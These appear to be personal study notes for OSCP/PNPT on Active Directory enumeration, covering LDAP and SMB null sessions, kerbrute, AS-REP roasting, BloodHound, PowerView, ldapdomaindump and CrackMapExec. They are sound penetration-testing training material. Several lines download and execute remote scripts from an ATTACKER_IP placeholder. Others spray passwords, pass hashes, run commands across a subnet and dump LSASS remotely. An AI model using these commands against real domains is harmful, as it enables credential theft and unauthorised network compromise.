---
tags: [oscp-journey, spectre, stage-3, pnpt, active-directory, enumeration, bloodhound, powerview]
module: 3
cert-stage: pnpt
difficulty: intermediate
date: 2026-04-08
phantom-refs: ["PHANTOM/MODULE 4 — Active Directory/04.2 — Initial Access"]
netgod-refs: []
---

# S3-03 — Active Directory Enumeration

## Why Enumeration Determines Everything

In Active Directory, the attack path is almost never obvious. BloodHound exists because manually identifying privilege escalation paths across thousands of users, groups, and ACLs is impractical. The goal of enumeration is to build a complete picture of the domain — every user, every group membership, every service account, every ACL misconfiguration — then find the shortest path to Domain Admin.

**Rule:** Never start attacking before you've enumerated. Enumerate first, then exploit the path BloodHound shows you.

---

## Enumeration With Credentials vs Without

| Approach | Tools | What You Get |
|---------|-------|-------------|
| **No credentials** | kerbrute, LDAP anonymous, nmap | Username list, AS-REP roastable users, basic domain info |
| **Any domain user** | BloodHound, PowerView, CME, ldapdomaindump | Full domain picture — users, groups, ACLs, computers, attack paths |

Getting even a single low-privilege domain user account unlocks dramatically more enumeration capability. This is why password spraying and LLMNR poisoning are so valuable — the goal is often just to get one set of credentials, then enumerate from there.

---

## Unauthenticated Enumeration — No Credentials

### LDAP Anonymous Bind

Some DCs allow anonymous LDAP queries. Worth checking before anything else:

```bash
# Test anonymous bind:
ldapsearch -x -H ldap://DC_IP -b "DC=domain,DC=local"
# If it returns data → anonymous bind enabled

# Enumerate users anonymously:
ldapsearch -x -H ldap://DC_IP -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName
ldapsearch -x -H ldap://DC_IP -b "DC=domain,DC=local" "(objectClass=group)" cn member

# More targeted queries:
ldapsearch -x -H ldap://DC_IP -b "DC=domain,DC=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" sAMAccountName
# userAccountControl:...2 = disabled accounts (filter them out)
```

### SMB Null Session

```bash
# Test null session:
smbclient -L //DC_IP -N            # -N = no password
smbmap -H DC_IP                    # Check share permissions

# enum4linux — comprehensive null session enumeration:
enum4linux -a DC_IP
enum4linux-ng DC_IP                # Newer, cleaner output

# What enum4linux reveals without creds (if null session works):
# - OS version and domain info
# - User list (via RID cycling)
# - Group memberships
# - Password policy (minimum length, lockout threshold)
```

### Kerbrute — Username Enumeration via Kerberos (No Creds)

Kerberos pre-authentication responses differ for valid vs invalid usernames. Kerbrute exploits this to enumerate valid domain usernames without any credentials — and without triggering account lockout (it never sends a password).

```bash
# Download kerbrute:
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

# Username enumeration:
kerbrute userenum --dc DC_IP -d domain.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
kerbrute userenum --dc DC_IP -d domain.local users.txt -o valid_users.txt

# Output:
# [+] VALID USERNAME: jsmith@domain.local
# [+] VALID USERNAME: administrator@domain.local
# [-] INVALID USERNAME: fakeuser@domain.local
```

**Building username wordlists for kerbrute:**
AD environments often follow naming conventions. Build a targeted list:
```bash
# Common AD naming conventions:
# firstname.lastname    → john.smith
# f.lastname            → j.smith
# firstnamelastname     → johnsmith
# flastname             → jsmith
# firstname             → john

# Use username-anarchy for generation:
git clone https://github.com/urbanadventurer/username-anarchy
ruby username-anarchy firstname lastname
# Generates all common format variations
```

### AS-REP Roasting Without Credentials

AS-REP Roasting (covered in depth in S3-04) can be performed without any credentials if you have a username list:

```bash
impacket-GetNPUsers domain.local/ -usersfile valid_users.txt -no-pass -dc-ip DC_IP -format hashcat -outputfile asrep_hashes.txt
```

---

## BloodHound — The Most Important AD Enumeration Tool

### What BloodHound Is

BloodHound uses graph theory to visualise Active Directory attack paths. It maps relationships between objects (users, groups, computers, GPOs) and their permissions as edges in a graph, then finds the shortest path from any owned principal to Domain Admin.

**Without BloodHound:** You manually check 5000 ACLs looking for GenericAll or WriteDACL permissions. Takes days.
**With BloodHound:** You run one query and see the exact 3-step path to DA in seconds.

### Architecture

- **Neo4j** — the graph database that stores the domain data
- **BloodHound GUI** — the interface for visualising and querying the data
- **SharpHound / bloodhound-python** — the collectors that gather data from the domain

### Setup on Kali

```bash
# Install BloodHound:
sudo apt install bloodhound

# Install Neo4j:
sudo apt install neo4j

# Start Neo4j:
sudo neo4j start
# Browse to: http://localhost:7474
# Default credentials: neo4j:neo4j → change to neo4j:password (or your choice)

# Start BloodHound:
bloodhound
# Login with your neo4j credentials
```

**Troubleshooting Neo4j:**
```bash
sudo neo4j status           # Check if running
sudo neo4j stop
sudo neo4j start
sudo systemctl enable neo4j # Start on boot
```

### Data Collection — SharpHound vs bloodhound-python

**SharpHound (C# — runs on Windows target):**
```powershell
# Transfer to target and run:
# Method 1 — from a PowerShell session on the target:
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp\

# Method 2 — run SharpHound.exe directly:
.\SharpHound.exe --CollectionMethods All --OutputDirectory C:\Temp\
.\SharpHound.exe --CollectionMethods All --ZipFilename output.zip
.\SharpHound.exe -c All -d domain.local --OutputDirectory C:\Temp\

# Collection methods:
# All      = collect everything (recommended)
# Default  = Default collection
# DCOnly   = Only query the DC (stealthy, less data)
# Session  = Session data (who is logged where)
# LoggedOn = Who is logged on to what machines
```

**bloodhound-python (runs on Kali — no Windows needed):**
```bash
# Install:
pip3 install bloodhound

# Run with credentials:
bloodhound-python -u user -p password -d domain.local -ns DC_IP --zip
bloodhound-python -u user -p password -d domain.local -dc dc01.domain.local --zip -c All

# Run with NTLM hash:
bloodhound-python -u user --hashes :NTLM_HASH -d domain.local -ns DC_IP --zip

# Flags:
# -u        = username
# -p        = password
# -d        = domain
# -ns       = DNS server (use DC IP)
# --zip     = compress output into zip
# -c All    = collect all data
# -dc       = specific DC to query

# Output: 20231015_BloodHound.zip (or individual JSON files)
```

**Importing into BloodHound:**
1. Open BloodHound GUI
2. Click the upload icon (top right)
3. Select the zip file (or individual JSON files)
4. Wait for import to complete
5. Check "Database Info" tab — should show user/group/computer counts

### BloodHound Queries — What to Run Immediately

After importing data, run these queries in order:

**Find all Domain Admins:**
```
Pre-built query: "Find all Domain Admins"
→ Shows all users who are members of Domain Admins (directly or via nested groups)
```

**Shortest Paths to Domain Admins:**
```
Pre-built query: "Find Shortest Paths to Domain Admins"
→ The most important query — shows every attack path from any node to DA
→ May show hundreds of paths if domain is misconfigured
```

**Find Computers where Domain Users are Local Admin:**
```
Pre-built query: "Find Computers where Domain Users are Local Admin"
→ Any machine where ALL domain users are local admin = trivial lateral movement
```

**Find AS-REP Roastable Users:**
```
Pre-built query: "List all Kerberoastable Accounts"
Pre-built query: "Find AS-REP Roastable Users (DontReqPreAuth)"
```

**Find principals with DCSync rights:**
```
Pre-built query: "Find Principals with DCSync Rights"
→ Users/groups that can perform DCSync — instant path to all hashes
```

**Shortest paths from owned principals:**
```
1. Mark your current user as owned: right-click node → Mark User as Owned
2. Pre-built query: "Shortest Paths from Owned Principals to Domain Admins"
→ Shows exact attack path from your current position to DA
```

**Custom Cypher queries:**
BloodHound uses Cypher query language for the Neo4j database. Useful custom queries:

```cypher
// Find all users with AdminCount=1 (indicates admin group membership at some point):
MATCH (u:User {admincount: true}) RETURN u.name

// Find computers with unconstrained delegation:
MATCH (c:Computer {unconstraineddelegation: true}) RETURN c.name

// Find users with GenericAll on Domain Admins group:
MATCH p=(n)-[r:GenericAll]->(g:Group {name: "DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN p

// Find all paths from a specific user to DA:
MATCH p=shortestPath((u:User {name: "JSMITH@DOMAIN.LOCAL"})-[*1..]->(g:Group {name: "DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

// Find kerberoastable users with admin rights somewhere:
MATCH (u:User {hasspn: true}) WHERE u.admincount = true RETURN u.name, u.serviceprincipalnames
```

### Reading BloodHound Edges — What Each Means

Each edge (arrow) in BloodHound represents a relationship between objects. These are the most important edges for attack path building:

| Edge | What it Means | How to Exploit |
|------|--------------|----------------|
| `MemberOf` | User/group is member of target group | Inherited permissions |
| `AdminTo` | Principal has local admin on computer | psexec, evil-winrm, etc. |
| `GenericAll` | Full control over target object | Reset password, add to groups, set SPN |
| `GenericWrite` | Write to object attributes | Set SPN → Kerberoast, set logon script |
| `WriteOwner` | Can change object's owner | Own it → grant yourself GenericAll |
| `WriteDACL` | Can modify object's ACL | Grant yourself GenericAll |
| `ForceChangePassword` | Can reset user's password without knowing current | Reset and login |
| `AddMember` | Can add members to group | Add yourself to Domain Admins |
| `ReadLAPSPassword` | Can read LAPS managed password | Get local admin password |
| `DCSync` | Can perform DCSync | Get all domain hashes |
| `AllExtendedRights` | Has all extended rights | Includes ForceChangePassword, ReadLAPSPassword |
| `Contains` | OU/container contains the object | GPO scope |
| `GpLink` | GPO is linked to container | GPO misconfiguration attacks |
| `HasSession` | User has active session on computer | Lateral movement target |
| `CanRDP` | Can RDP to the computer | Remote access |
| `CanPSRemote` | Can WinRM to the computer | evil-winrm access |
| `SQLAdmin` | Has SA access to SQL instance | xp_cmdshell RCE |
| `TrustedBy` | Domain trusts this domain | Cross-domain attacks |

---

## PowerView — Manual AD Enumeration

PowerView is a PowerShell tool for Active Directory reconnaissance. While BloodHound gives the visual picture, PowerView lets you query specific things interactively.

### Loading PowerView

```powershell
# Method 1 — Download and import (writes to disk):
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerView.ps1')

# Method 2 — Import from file:
Import-Module .\PowerView.ps1
. .\PowerView.ps1    # Dot-source

# Method 3 — Bypass execution policy:
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerView.ps1')"

# PowerView download:
# github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
```

### Core PowerView Commands — Every Important One

**Domain and forest information:**
```powershell
Get-NetDomain                      # Current domain info (name, DCs, SID)
Get-NetDomainController            # Domain controllers
Get-NetForest                      # Forest info
Get-NetForestDomain                # All domains in the forest
Get-DomainPolicy                   # Domain password policy
(Get-DomainPolicy)."system access" # Password policy details (min length, lockout)
```

**User enumeration:**
```powershell
Get-NetUser                        # All domain users (all attributes)
Get-NetUser | select samaccountname, description, memberof    # Key fields
Get-NetUser -Username jsmith       # Specific user

# Find users with descriptions (often contain passwords):
Get-NetUser | select samaccountname, description | where {$_.description -ne $null}

# Find admin users:
Get-NetUser | where {$_.admincount -eq 1} | select samaccountname

# Find Kerberoastable accounts (have SPN set):
Get-NetUser -SPN | select samaccountname, serviceprincipalname

# Find AS-REP Roastable accounts (pre-auth not required):
Get-NetUser -PreauthNotRequired | select samaccountname

# Find users with admin rights on machines:
Find-LocalAdminAccess               # Where can current user admin? (slow but thorough)
Find-LocalAdminAccess -Verbose      # Verbose output
```

**Group enumeration:**
```powershell
Get-NetGroup                        # All groups
Get-NetGroup -GroupName "Domain Admins"     # Specific group
Get-NetGroupMember "Domain Admins"          # Members of Domain Admins
Get-NetGroupMember "Domain Admins" -Recurse # Recursive (nested group members)

# All groups a user belongs to:
Get-NetGroup -UserName jsmith
```

**Computer enumeration:**
```powershell
Get-NetComputer                     # All domain computers
Get-NetComputer | select name, operatingsystem, lastlogon
Get-NetComputer -OperatingSystem "*Server*"    # Only servers
Get-NetComputer -Ping               # Only live machines (ping test)

# Find machines where specific users are logged in:
Find-DomainUserLocation -UserName "administrator"
Find-DomainUserLocation -GroupName "Domain Admins"
```

**Share enumeration:**
```powershell
# Find all accessible shares:
Find-DomainShare -Verbose
Find-DomainShare -CheckShareAccess  # Only shares you can read

# Find interesting files across all accessible shares:
Find-InterestingDomainShareFile -Include *.txt,*.xml,*.ini,*.config
Find-InterestingDomainShareFile -Include *.ps1,*.bat,*.vbs
```

**ACL enumeration — critical for finding attack paths:**
```powershell
# Get ACLs for a specific object:
Get-ObjectAcl -SamAccountName jsmith -ResolveGUIDs

# Find interesting ACLs (non-default permissions):
Get-ObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDACL|WriteOwner"}

# Find ACLs where a specific user has permissions over other objects:
Get-ObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -match "jsmith"}

# PowerView's built-in ACL finder:
Invoke-ACLScanner -ResolveGUIDs    # Finds potentially dangerous ACLs across entire domain

# Check if current user has any interesting ACLs:
Get-ObjectAcl -SamAccountName $env:USERNAME -ResolveGUIDs | ? {$_.ActiveDirectoryRights -ne $null}
```

**GPO enumeration:**
```powershell
Get-NetGPO                         # All GPOs
Get-NetGPO | select displayname, name
Get-NetGPO -ComputerName WIN10-01  # GPOs applied to specific computer
Get-NetOU                          # All OUs
Get-DomainGPO -ComputerIdentity WIN10-01   # Newer alias
```

**Session and login information:**
```powershell
# Who is currently logged in to which machines:
Get-NetLoggedon -ComputerName DC01         # Who's logged into DC01
Get-NetSession -ComputerName DC01          # Sessions on DC01
Get-LoggedOnLocal -ComputerName WIN10-01   # Local logons on WIN10-01

# Process remote enumeration across all machines:
Invoke-UserHunter                   # Find where domain admins are logged in (noisy)
Invoke-UserHunter -GroupName "Domain Admins"   # More targeted
Invoke-UserHunter -Stealth          # Stealthier version (only checks common servers)
```

---

## ldapdomaindump — Dump AD via LDAP to Readable Files

ldapdomaindump queries LDAP and produces HTML/JSON output that's easy to browse.

```bash
# Install:
pip3 install ldapdomaindump

# Run:
ldapdomaindump -u domain\\username -p password DC_IP
ldapdomaindump -u domain\\username -p password DC_IP -o /tmp/loot/

# With NTLM hash:
ldapdomaindump -u domain\\username -p aad3b435b51404ee:NTLM_HASH DC_IP

# Output files created:
ls /tmp/loot/
# domain_computers.html / .json / .grep
# domain_groups.html / .json / .grep
# domain_policy.html / .json
# domain_trusts.html / .json
# domain_users.html / .json
# domain_users_by_group.html
```

**Reading ldapdomaindump output:**
```bash
# Open HTML files in browser:
firefox domain_users.html &

# Or parse JSON:
cat domain_users.json | python3 -m json.tool | grep -A3 "sAMAccountName"

# Quick text grep for useful info:
grep -i "description" domain_users.grep    # User descriptions (may contain passwords)
grep -i "password" domain_users.grep
grep "DONT_EXPIRE_PASSWORD\|PASSWD_NOTREQD" domain_users.grep  # Password policy exceptions
grep "Domain Admins" domain_groups.grep
```

---

## CrackMapExec — Authenticated Enumeration at Scale

CrackMapExec (CME) is the Swiss army knife for authenticated Windows network enumeration. Run it with any credentials you have.

```bash
# Basic authenticated check (who responds + OS info):
crackmapexec smb 192.168.0.0/24 -u user -p password

# User and group enumeration:
crackmapexec smb DC_IP -u user -p password --users      # All domain users
crackmapexec smb DC_IP -u user -p password --groups     # All domain groups
crackmapexec smb DC_IP -u user -p password --local-users  # Local users only

# Share enumeration:
crackmapexec smb DC_IP -u user -p password --shares     # List all shares
crackmapexec smb DC_IP -u user -p password -M spider_plus --share SYSVOL  # Spider SYSVOL

# Password policy:
crackmapexec smb DC_IP -u user -p password --pass-pol

# RID brute (enumerate users via RID cycling — sometimes works on restricted domains):
crackmapexec smb DC_IP -u user -p password --rid-brute

# Spray against all hosts in a subnet:
crackmapexec smb 192.168.0.0/24 -u user -p password --continue-on-success

# Execute command on all machines where user is admin:
crackmapexec smb 192.168.0.0/24 -u user -p password -x "whoami"
crackmapexec smb 192.168.0.0/24 -u user -p password -X "Get-Process"  # PowerShell

# Pass-the-Hash:
crackmapexec smb 192.168.0.0/24 -u admin -H NTLM_HASH --local-auth

# WinRM enumeration:
crackmapexec winrm 192.168.0.0/24 -u user -p password

# LDAP enumeration:
crackmapexec ldap DC_IP -u user -p password --asreproast asrep.txt
crackmapexec ldap DC_IP -u user -p password --kerberoasting tgs.txt

# Module usage:
crackmapexec smb DC_IP -u user -p password -M gpp_password    # Find GPP passwords
crackmapexec smb DC_IP -u user -p password -M lsassy          # Dump LSASS remotely
crackmapexec smb DC_IP -u user -p password -M mimikatz         # Run Mimikatz remotely
```

**Reading CME output:**
```
SMB  192.168.0.100  445  WIN10-01  [+] domain\user:password (Pwn3d!)
│                                   │                          └ Has local admin
│                                   └ Authentication succeeded
└ Protocol and port

SMB  192.168.0.100  445  WIN10-01  [-] domain\user:wrongpassword STATUS_LOGON_FAILURE
                                                                  └ Wrong credentials

SMB  192.168.0.100  445  WIN10-01  [-] domain\user:password STATUS_ACCOUNT_LOCKED_OUT
                                                             └ STOP — account locked
```

---

## GPP Passwords — Check SYSVOL First

Before running heavy tools, check SYSVOL for GPP passwords. This is a 30-second check that sometimes yields instant credentials.

```bash
# From Kali:
smbclient //DC_IP/SYSVOL -U domain/user%pass
# Navigate to: domain.local/Policies/
# Search for Groups.xml, Services.xml, Datasources.xml, Printers.xml, Drives.xml

# Automated with CME:
crackmapexec smb DC_IP -u user -p pass -M gpp_password

# If you find a cPassword field:
gpp-decrypt "BASE64_ENCRYPTED_VALUE"
# Example: gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aNVMsmrkmIXeqgkA=="
```

---

## NETLOGON Scripts — Check for Embedded Credentials

```bash
smbclient //DC_IP/NETLOGON -U domain/user%pass
ls                        # List scripts
get logon.bat             # Download and read
get startup.vbs
```

Common finds: hardcoded `net use` commands with credentials, database connection strings, API keys in legacy scripts.

---

## The Complete Enumeration Workflow — OSCP/PNPT Order

```bash
# Step 1 — No creds: check for unauthenticated access:
ldapsearch -x -H ldap://DC_IP -b "DC=domain,DC=local" 2>/dev/null | head -20
enum4linux -a DC_IP 2>/dev/null | head -50

# Step 2 — No creds: enumerate usernames:
kerbrute userenum --dc DC_IP -d domain.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_users.txt

# Step 3 — No creds: AS-REP roast with userlist:
impacket-GetNPUsers domain.local/ -usersfile valid_users.txt -no-pass -dc-ip DC_IP -format hashcat -outputfile asrep.txt

# Step 4 — Got credentials: quick CME check:
crackmapexec smb DC_IP -u user -p pass --pass-pol
crackmapexec smb DC_IP -u user -p pass --users | tee users.txt
crackmapexec smb DC_IP -u user -p pass --groups
crackmapexec smb DC_IP -u user -p pass --shares

# Step 5 — BloodHound collection:
bloodhound-python -u user -p pass -d domain.local -ns DC_IP --zip -c All

# Step 6 — SYSVOL check:
crackmapexec smb DC_IP -u user -p pass -M gpp_password

# Step 7 — Import BloodHound, run standard queries:
# Mark owned users, run shortest path queries

# Step 8 — Kerberoasting:
impacket-GetUserSPNs domain.local/user:pass -dc-ip DC_IP -request -outputfile tgs.txt

# Step 9 — AS-REP roasting with creds (more thorough):
impacket-GetNPUsers domain.local/user:pass -dc-ip DC_IP -format hashcat -outputfile asrep.txt

# Step 10 — PowerView for specific queries:
# (Run from Windows machine or via evil-winrm/psexec session)
Get-NetUser -SPN | select samaccountname,serviceprincipalname
Invoke-ACLScanner -ResolveGUIDs
Find-LocalAdminAccess
```

---

## Quick Reference

```bash
# Unauthenticated:
ldapsearch -x -H ldap://DC_IP -b "DC=domain,DC=local"
enum4linux -a DC_IP
kerbrute userenum --dc DC_IP -d domain.local wordlist.txt

# BloodHound collection (Kali):
bloodhound-python -u user -p pass -d domain.local -ns DC_IP --zip -c All

# BloodHound startup:
sudo neo4j start && bloodhound

# CME enumeration:
crackmapexec smb DC_IP -u user -p pass --users --groups --shares --pass-pol
crackmapexec smb SUBNET/24 -u user -p pass --continue-on-success
crackmapexec smb DC_IP -u user -p pass -M gpp_password

# ldapdomaindump:
ldapdomaindump -u domain\\user -p pass DC_IP -o /tmp/loot/

# PowerView key commands:
Get-NetUser | select samaccountname,description
Get-NetUser -SPN | select samaccountname,serviceprincipalname
Get-NetUser -PreauthNotRequired | select samaccountname
Get-NetGroupMember "Domain Admins" -Recurse
Invoke-ACLScanner -ResolveGUIDs
Find-LocalAdminAccess
```

---

## Common Mistakes

> [!warning] Enumeration mistakes that waste time
> 1. **Running BloodHound before adding hostnames to /etc/hosts.** Kerberos-based collection fails if the DC can't be reached by hostname. Always add `DC_IP dc01.domain.local domain.local` to `/etc/hosts` first.
> 2. **Not marking owned principals in BloodHound.** The "Shortest paths from owned principals" query only works if you right-click your user and mark them as owned. Without this step, the most useful query returns nothing.
> 3. **Ignoring user descriptions in AD.** Helpdesk staff sometimes store passwords in the user Description field. `Get-NetUser | select samaccountname,description` takes 5 seconds — always run it.
> 4. **Not checking SYSVOL before running heavy tools.** GPP passwords in SYSVOL can give you DA-level credentials instantly. Check this first — it takes 30 seconds.
> 5. **Not using `-Recurse` for group membership.** `Get-NetGroupMember "Domain Admins"` only shows direct members. Use `-Recurse` to catch users who are DA via nested group membership.
> 6. **Only running one collection method in BloodHound.** Use `-c All` or `--CollectionMethods All` to get session data (who's logged in where) in addition to ACL and group data. Session data is essential for `Invoke-UserHunter` equivalent queries.

---

## Practice Resources

| Resource | What to do |
|----------|-----------|
| TryHackMe — "Attacktive Directory" | Full AD enumeration guided lab |
| TryHackMe — "Enumerating Active Directory" | BloodHound and PowerView focused |
| HTB — Forest | BloodHound reveals AS-REP → WriteDACL → DCSync path |
| HTB — Active | Kerberoasting path visible in BloodHound |
| HTB — Sauna | Full BloodHound enumeration → DC sync chain |
| TCM Security — PEH Course | Full BloodHound + PowerView demo in the AD sections |
| BloodHound.readthedocs.io | Official docs — custom queries and edge explanations |
| HackTricks — Enumerating Active Directory | Comprehensive command reference |
| [[PHANTOM/MODULE 4 — Active Directory/04.2 — Initial Access]] | Full technical depth in PHANTOM vault |
